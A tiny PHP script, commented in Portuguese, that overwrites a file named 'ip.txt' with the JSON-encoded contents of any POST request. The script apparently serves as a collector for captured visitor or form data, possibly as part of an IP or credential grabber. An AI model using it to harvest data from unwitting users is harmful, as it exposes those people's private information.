<?php

$f = fopen("ip.txt", "w"); // Abre o arquivo e apaga o conteúdo existente
fwrite($f, json_encode($_POST)); // Escreve os dados do POST no arquivo
fwrite($f, "\n"); // Adiciona uma nova linha
fclose($f); // Fecha o arquivo

?>
